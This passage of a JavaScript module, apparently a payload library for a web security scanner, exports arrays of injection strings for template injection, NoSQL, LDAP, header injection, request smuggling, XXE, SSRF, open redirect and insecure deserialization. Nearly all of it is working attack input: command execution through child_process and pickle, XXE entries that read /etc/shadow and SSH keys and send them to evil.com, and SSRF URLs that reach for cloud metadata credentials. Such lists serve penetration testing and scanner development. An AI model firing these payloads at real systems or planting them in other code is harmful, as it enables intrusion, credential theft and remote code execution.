  '<%= Dir.entries("/") %>',

  // --- Tornado (Python) ---
  '{% import os %}{{ os.popen("id").read() }}',
  '{% import subprocess %}{{ subprocess.check_output("id", shell=True) }}',

  // --- Handlebars (Node.js) ---
  '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require(\'child_process\').execSync(\'id\');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}',

  // --- EJS (Node.js) ---
  '<%= global.process.mainModule.require("child_process").execSync("id").toString() %>',

  // --- Nunjucks (Node.js) ---
  '{{range.constructor("return global.process.mainModule.require(\'child_process\').execSync(\'id\').toString()")()}}',

  // --- Dot (Node.js) ---
  '{{=global.process.mainModule.require("child_process").execSync("id").toString()}}',

  // --- Dust.js ---
  '{@if cond="require(\'child_process\').execSync(\'id\').toString()"}true{/if}',

  // --- General detection ---
  'a]}}{{7*7',
  'a]}}${7*7',
  'a{*comment*}b',
  '{{constructor.constructor("return this")().process.mainModule.require("child_process").execSync("id").toString()}}',
];


// =============================================================================
// NOSQL_PAYLOADS
// =============================================================================
// NoSQL injection payloads for MongoDB, CouchDB, and similar. ~60 entries.
// =============================================================================

export const NOSQL_PAYLOADS = [
  // --- MongoDB authentication bypass ---
  '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
  '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
  '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}',
  '{"username": {"$exists": true}, "password": {"$exists": true}}',
  '{"username": "admin", "password": {"$gt": ""}}',
  '{"username": "admin", "password": {"$ne": "wrongpassword"}}',
  '{"username": "admin", "password": {"$regex": ".*"}}',
  '{"username": {"$in": ["admin","administrator","root"]}, "password": {"$gt": ""}}',
  '{"username": {"$nin": [""]}, "password": {"$nin": [""]}}',

  // --- URL parameter injection ---
  'username[$ne]=&password[$ne]=',
  'username[$gt]=&password[$gt]=',
  'username[$regex]=.*&password[$regex]=.*',
  'username[$exists]=true&password[$exists]=true',
  'username=admin&password[$ne]=wrongpassword',
  'username=admin&password[$gt]=',
  'username=admin&password[$regex]=^a',
  'username=admin&password[$regex]=^b',
  'username[$eq]=admin&password[$ne]=x',
  'username[$in][]=admin&password[$ne]=x',

  // --- Operator injection ---
  '{"$where": "1==1"}',
  '{"$where": "this.password.length > 0"}',
  '{"$where": "this.username == \'admin\'"}',
  '{"$where": "sleep(5000)"}',
  '{"$where": "function(){return true;}"}',
  '{"$where": "function(){sleep(5000);return true;}"}',
  '{"$or": [{"username": "admin"}, {"username": {"$gt": ""}}]}',
  '{"$and": [{"username": "admin"}, {"password": {"$gt": ""}}]}',
  '{"$nor": [{"username": "nonexistent"}]}',
  '{"$comment": "injection test"}',

  // --- Data exfiltration ---
  'username=admin&password[$regex]=^a.*$',
  'username=admin&password[$regex]=^b.*$',
  'username=admin&password[$regex]=^p.*$',
  'username=admin&password[$regex]=^pa.*$',
  'username=admin&password[$regex]=^pas.*$',
  '{"username": "admin", "password": {"$regex": "^a"}}',
  '{"username": "admin", "password": {"$regex": "^b"}}',

  // --- JavaScript injection (MongoDB) ---
  "'; return true; var a='",
  "'; return '1'=='1'; var a='",
  '\'; return true; //\'',
  '0; return true',
  "1 || 1==1",
  "'||1||'",
  '{"$gt":""}',

  // --- MongoDB command injection ---
  '{"$where": "this.constructor.constructor(\'return process\')().mainModule.require(\'child_process\').execSync(\'id\')"}',
  'db.users.find({$where: function(){return true;}})',
  'db.users.find({username: {$regex: ".*"}})',
  'db.users.find({$or: [{}, {username: "admin"}]})',

  // --- CouchDB ---
  '{"selector": {"_id": {"$gt": null}}}',
  '{"selector": {"username": {"$regex": ".*"}}}',
  '{"selector": {"password": {"$ne": ""}}}',

  // --- Aggregation pipeline injection ---
  '[{"$match": {"username": "admin"}}, {"$project": {"password": 1}}]',
  '[{"$lookup": {"from": "users", "localField": "x", "foreignField": "x", "as": "all"}}]',

  // --- SSJI (Server-Side JavaScript Injection) ---
  'res.end(require("child_process").execSync("id").toString())',
  'var x = new Function("return process")(); x.mainModule.require("child_process").execSync("id")',
  'this.constructor.constructor("return process")().exit()',
];


// =============================================================================
// LDAP_PAYLOADS
// =============================================================================
// LDAP injection test payloads — authentication bypass, wildcard,
// and attribute extraction. ~40 entries.
// =============================================================================

export const LDAP_PAYLOADS = [
  // --- Authentication bypass ---
  '*',
  '*)(&',
  '*)(|(&',
  '*()|&\'',
  'admin*',
  'admin*)((|userPassword=*)',
  '*)(uid=*))(|(uid=*',
  '*)(%26',
  'admin)(&)',
  'admin)(|(password=*))',

  // --- OR injection ---
  '*(|(mail=*))',
  '*(|(objectclass=*))',
  '*(|(uid=*))',
  '*)(|(uid=*)',
  'x)(|(cn=*))',
  '*))|',

  // --- AND injection ---
  '*)(&(objectClass=*)',
  'admin)(&(userPassword=*))',
  '*)(&(uid=admin)(userPassword=*))',
  '*))%00',

  // --- Wildcard enumeration ---
  'a*',
  'b*',
  'c*',
  'admin*',
  '*admin*',
  '*@example.com',
  '*(cn=*)',
  '*(sn=*)',
  '*(mail=*)',
  '*(telephoneNumber=*)',

  // --- Null byte / filter termination ---
  'x%00',
  'admin%00',
  '*%00',
  'admin)%00',
  '*)%00',
  'admin)(cn=*))\x00',

  // --- Attribute extraction ---
  '*(userPassword=*)',
  '*(|(userPassword=a*)(userPassword=b*)(userPassword=c*))',
  '*))(|(userPassword=*)',
  'admin)(userPassword=*',
  '*(description=*)',
];


// =============================================================================
// HEADER_INJECTION
// =============================================================================
// HTTP header injection, response splitting, and request smuggling
// test payloads. ~50 entries.
// =============================================================================

export const HEADER_INJECTION = [
  // --- CRLF injection (response splitting) ---
  '%0d%0aInjected-Header: true',
  '%0d%0aSet-Cookie: injected=true',
  '%0d%0aX-Injected: true',
  '%0d%0a%0d%0a<script>alert(1)</script>',
  '%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>',
  '%0d%0aLocation: http://evil.com',
  '%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>',
  '\\r\\nInjected-Header: true',
  '\\r\\nSet-Cookie: injected=true',
  '\\r\\n\\r\\n<script>alert(1)</script>',
  '%0aInjected-Header: true',
  '%0dInjected-Header: true',
  '%23%0dInjected-Header: true',
  '%E5%98%8A%E5%98%8DInjected-Header: true',

  // --- Host header injection ---
  'evil.com',
  'evil.com%00.target.com',
  'evil.com%23.target.com',
  'target.com@evil.com',
  'target.com#@evil.com',
  'evil.com\\t.target.com',
  'evil.com%09.target.com',
  'evil.com/.target.com',

  // --- X-Forwarded-For spoofing ---
  'X-Forwarded-For: 127.0.0.1',
  'X-Forwarded-For: 127.0.0.1, 10.0.0.1',
  'X-Forwarded-Host: evil.com',
  'X-Forwarded-Proto: https',
  'X-Real-IP: 127.0.0.1',
  'X-Original-URL: /admin',
  'X-Rewrite-URL: /admin',
  'X-Custom-IP-Authorization: 127.0.0.1',
  'X-Originating-IP: 127.0.0.1',
  'X-Remote-IP: 127.0.0.1',
  'X-Client-IP: 127.0.0.1',
  'X-Remote-Addr: 127.0.0.1',
  'True-Client-IP: 127.0.0.1',
  'Cluster-Client-IP: 127.0.0.1',
  'X-ProxyUser-Ip: 127.0.0.1',

  // --- HTTP request smuggling ---
  'Transfer-Encoding: chunked',
  'Transfer-Encoding : chunked',
  'Transfer-Encoding: xchunked',
  'Transfer-Encoding: chunked\\r\\nTransfer-Encoding: x',
  'Content-Length: 0\\r\\nTransfer-Encoding: chunked',
  'Transfer-Encoding: chunked\\r\\nContent-Length: 0',
  'Transfer-Encoding:\\tchunked',
  'Transfer-Encoding:\\x0bchunked',
  ' Transfer-Encoding: chunked',
  'X: X\\nTransfer-Encoding: chunked',
  'Transfer-Encoding\\n: chunked',

  // --- Cache poisoning ---
  'X-Forwarded-Host: evil.com',
  'X-Host: evil.com',
  'X-Forwarded-Server: evil.com',
  'X-HTTP-Host-Override: evil.com',
  'Forwarded: for=evil.com',
];


// =============================================================================
// XXEI_PAYLOADS
// =============================================================================
// XML External Entity (XXE) injection payloads — file read, SSRF,
// blind OOB, parameter entities, and filter bypasses. ~80 entries.
// =============================================================================

export const XXE_PAYLOADS = [
  // --- Basic file read ---
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/version">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/.env">]><foo>&xxe;</foo>',

  // --- Windows file read ---
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/boot.ini">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><foo>&xxe;</foo>',

  // --- SSRF ---
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22/">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:6379/">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.target.com/">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_INFO">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "dict://127.0.0.1:6379/INFO">]><foo>&xxe;</foo>',

  // --- Blind / Out-of-Band (OOB) ---
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/?data=test">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">%dtd;]>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"><!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">%dtd;]>',

  // --- Parameter entities ---
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://evil.com/?x=%xxe;\'>">%eval;%exfil;]>',
  '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]><foo>test</foo>',

  // --- PHP wrappers ---
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=string.rot13/resource=/etc/passwd">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',

  // --- Billion laughs (DoS detection) ---
  '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><root>&lol3;</root>',

  // --- CDATA exfiltration ---
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % start "<![CDATA["><!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % end "]]>"><!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">%dtd;]><foo>&all;</foo>',

  // --- SVG XXE ---
  '<?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>',
  '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="expect://id"/></svg>',

  // --- XLSX / DOCX embedded XXE ---
  '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="&xxe;" ContentType="application/xml"/></Types>',

  // --- SOAP XXE ---
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>',

  // --- XInclude ---
  '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
  '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/shadow"/></foo>',

  // --- UTF-7 encoded ---
  '<?xml version="1.0" encoding="UTF-7"?>+ADw-!DOCTYPE foo+AFs-+ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-+ADw-foo+AD4-+ACY-xxe+ADs-+ADw-/foo+AD4-',

  // --- Encoding bypass ---
  '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
  '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
];


// =============================================================================
// SSRF_PAYLOADS
// =============================================================================
// Server-Side Request Forgery (SSRF) payloads — cloud metadata, internal
// services, protocol smuggling, bypass techniques. ~80 entries.
// =============================================================================

export const SSRF_PAYLOADS = [
  // --- AWS metadata ---
  'http://169.254.169.254/latest/meta-data/',
  'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
  'http://169.254.169.254/latest/meta-data/hostname',
  'http://169.254.169.254/latest/meta-data/local-ipv4',
  'http://169.254.169.254/latest/meta-data/public-ipv4',
  'http://169.254.169.254/latest/user-data/',
  'http://169.254.169.254/latest/dynamic/instance-identity/document',
  'http://169.254.169.254/latest/api/token',

  // --- GCP metadata ---
  'http://metadata.google.internal/computeMetadata/v1/',
  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
  'http://metadata.google.internal/computeMetadata/v1/project/project-id',
  'http://metadata.google.internal/computeMetadata/v1/instance/hostname',

  // --- Azure metadata ---
  'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
  'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',

  // --- DigitalOcean metadata ---
  'http://169.254.169.254/metadata/v1/',
  'http://169.254.169.254/metadata/v1/hostname',
  'http://169.254.169.254/metadata/v1/id',

  // --- Kubernetes ---
  'https://kubernetes.default.svc/',
  'https://kubernetes.default.svc/api/v1/namespaces',
  'https://kubernetes.default.svc/api/v1/pods',
  'http://10.0.0.1:10255/pods',

  // --- Internal services ---
  'http://127.0.0.1/',
  'http://127.0.0.1:22/',
  'http://127.0.0.1:80/',
  'http://127.0.0.1:443/',
  'http://127.0.0.1:3306/',
  'http://127.0.0.1:5432/',
  'http://127.0.0.1:6379/',
  'http://127.0.0.1:8080/',
  'http://127.0.0.1:8443/',
  'http://127.0.0.1:9200/',
  'http://127.0.0.1:27017/',
  'http://localhost/',
  'http://0.0.0.0/',
  'http://[::1]/',
  'http://0/',
  'http://0x7f000001/',
  'http://2130706433/',
  'http://017700000001/',

  // --- Bypass: decimal/hex/octal IP ---
  'http://2852039166/',
  'http://0x7f.0x0.0x0.0x1/',
  'http://0177.0.0.01/',
  'http://0x7f000001/',
  'http://127.1/',
  'http://127.0.1/',

  // --- Bypass: URL encoding ---
  'http://%31%32%37%2e%30%2e%30%2e%31/',
  'http://127.0.0.1%00@evil.com/',
  'http://evil.com@127.0.0.1/',
  'http://127.0.0.1%23@evil.com/',
  'http://evil.com#@127.0.0.1/',

  // --- Bypass: DNS rebinding ---
  'http://1.1.1.1 &@127.0.0.1# @evil.com/',
  'http://127.0.0.1.nip.io/',
  'http://spoofed.burpcollaborator.net/',
  'http://localtest.me/',
  'http://customer1.app.localhost.my.company.127.0.0.1.nip.io/',

  // --- Protocol smuggling ---
  'gopher://127.0.0.1:6379/_INFO%0d%0a',
  'gopher://127.0.0.1:6379/_SET%20key%20value%0d%0a',
  'gopher://127.0.0.1:25/_HELO%20evil.com%0d%0a',
  'gopher://127.0.0.1:11211/_stats%0d%0a',
  'dict://127.0.0.1:6379/INFO',
  'dict://127.0.0.1:11211/stats',
  'file:///etc/passwd',
  'file:///etc/hosts',
  'ftp://127.0.0.1/',
  'tftp://127.0.0.1/test',
  'ldap://127.0.0.1/',
  'jar:http://evil.com/evil.jar!/',

  // --- Redirect-based ---
  'http://evil.com/redirect?url=http://169.254.169.254/latest/meta-data/',
  'http://evil.com/redirect?url=http://127.0.0.1/',
  'https://evil.com/redirect?url=http://metadata.google.internal/',

  // --- Bypass: enclosed alphanumerics ---
  'http://\u24B6\u24B7\u24B8.com/',
  'http://\u2460\u2461\u2462.\u2460.\u2460.\u2460/',

  // --- IPv6 ---
  'http://[::ffff:127.0.0.1]/',
  'http://[0:0:0:0:0:ffff:127.0.0.1]/',
  'http://[::ffff:7f00:1]/',
  'http://[::1]:80/',
  'http://[::1]:8080/',
];


// =============================================================================
// OPEN_REDIRECT_PAYLOADS
// =============================================================================
// Open redirect payloads — URL parsing edge-cases, protocol-relative,
// backslash tricks, and encoding bypasses. ~60 entries.
// =============================================================================

export const OPEN_REDIRECT_PAYLOADS = [
  // --- Basic ---
  'http://evil.com',
  'https://evil.com',
  '//evil.com',
  '///evil.com',
  '////evil.com',
  '/\\evil.com',
  '\\evil.com',
  'https:evil.com',
  'http:evil.com',

  // --- URL parsing tricks ---
  'https://target.com@evil.com',
  'https://evil.com#target.com',
  'https://evil.com?target.com',
  'https://evil.com\\target.com',
  'https://evil.com/.target.com',
  'https://target.com.evil.com',
  '//evil.com/%2f..',
  '//evil.com/%2F..',
  '///evil.com/%2F..',
  '////evil.com/%2F..',
  '/\\/evil.com',

  // --- Encoding ---
  '%2f%2fevil.com',
  '%2f%5cevil.com',
  '/%09/evil.com',
  '/%5cevil.com',
  '%00//evil.com',
  '%0d%0aLocation: http://evil.com',
  '%19//evil.com',
  '//%E3%80%82evil.com',

  // --- Protocol handlers ---
  'javascript:alert(document.domain)//',
  'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
  'javas%09cript:alert(1)',
  'java%0d%0ascript:alert(1)',

  // --- Double URL encoding ---
  '%252f%252fevil.com',
  '%252f%255cevil.com',

  // --- Using whitespace ---
  ' //evil.com',
  '\t//evil.com',
  '  //evil.com',
  ' /evil.com',

  // --- Using @ ---
  'http://evil.com%40target.com',
  'http://target.com%25%40evil.com',
  'http://target.com:80@evil.com',
  'http://target.com:80%40evil.com',
  'http://target.com%00@evil.com',

  // --- Path-based ---
  '/redirect?url=//evil.com',
  '/redirect?url=http://evil.com',
  '/redirect?next=//evil.com',
  '/redirect?next=http://evil.com',
  '/redirect?return=//evil.com',
  '/redirect?returnTo=//evil.com',
  '/redirect?goto=//evil.com',
  '/redirect?dest=//evil.com',
  '/redirect?destination=//evil.com',
  '/redirect?rurl=//evil.com',
  '/redirect?continue=//evil.com',
  '/redirect?forward=//evil.com',
  '/redirect?target=//evil.com',

  // --- CRLF + redirect ---
  '%0d%0aLocation:%20http://evil.com',
  '%E5%98%8A%E5%98%8DLocation:%20http://evil.com',
];


// =============================================================================
// DESERIALIZATION_PAYLOADS
// =============================================================================
// Insecure deserialization payloads — Java (ysoserial gadgets),
// PHP, Python (pickle), .NET, Ruby, and Node.js. ~60 entries.
// =============================================================================

export const DESERIALIZATION_PAYLOADS = [
  // --- Java (ysoserial gadget chains) ---
  'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==',
  'aced000573720011',
  'rO0ABXNy',
  'H4sIAAAAAAAA',
  // Common ysoserial gadget names for reference
  'CommonsCollections1',
  'CommonsCollections2',
  'CommonsCollections3',
  'CommonsCollections4',
  'CommonsCollections5',
  'CommonsCollections6',
  'CommonsCollections7',
  'CommonsCollectionsK1',
  'CommonsCollectionsK2',
  'CommonsBeanutils1',
  'Spring1',
  'Spring2',
  'Groovy1',
  'JRMPClient',
  'JRMPListener',
  'Jdk7u21',
  'BeanShell1',
  'Hibernate1',
  'Hibernate2',
  'MozillaRhino1',
  'MozillaRhino2',
  'Myfaces1',
  'Myfaces2',
  'URLDNS',
  'Wicket1',

  // --- PHP ---
  'O:8:"stdClass":0:{}',
  'a:1:{s:4:"test";s:4:"data";}',
  'O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}',
  'O:14:"PendingCommand":1:{s:7:"command";s:2:"id";}',
  'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":1:{s:9:"\\x00*\\x00event";s:2:"id";}',

  // --- Python (pickle) ---
  "cos\\nsystem\\n(S'id'\\ntR.",
  "cposix\\nsystem\\n(S'id'\\ntR.",
  "c__builtin__\\neval\\n(S'__import__(\"os\").system(\"id\")'\\ntR.",
  "(cos\\nsystem\\nS'id'\\no.",
  "\\x80\\x03cos\\nsystem\\nq\\x00X\\x02\\x00\\x00\\x00idq\\x01\\x85q\\x02Rq\\x03.",
  'import pickle; pickle.loads(b"cos\\nsystem\\n(S\'id\'\\ntR.")',

  // --- .NET (ViewState, BinaryFormatter) ---
  'AAEAAAD/////AQAAAA==',
  '__VIEWSTATE=',
  '__VIEWSTATEGENERATOR=',
  '__EVENTVALIDATION=',

  // --- Ruby (Marshal) ---
  '\\x04\\x08o:\\x15ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy',
  'ERB.new("<%= `id` %>").result',
  "Marshal.load(\"\\x04\\x08...\")",

  // --- Node.js ---
  '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}()"}',
  '{"__proto__":{"isAdmin":true}}',
  '{"constructor":{"prototype":{"isAdmin":true}}}',

  // --- Detection indicators ---
  'Content-Type: application/x-java-serialized-object',
  'Content-Type: application/x-java-serialized-object-stream',
  'Transfer-Encoding: serialized',
  'X-Java-Serialized-Object: true',
];
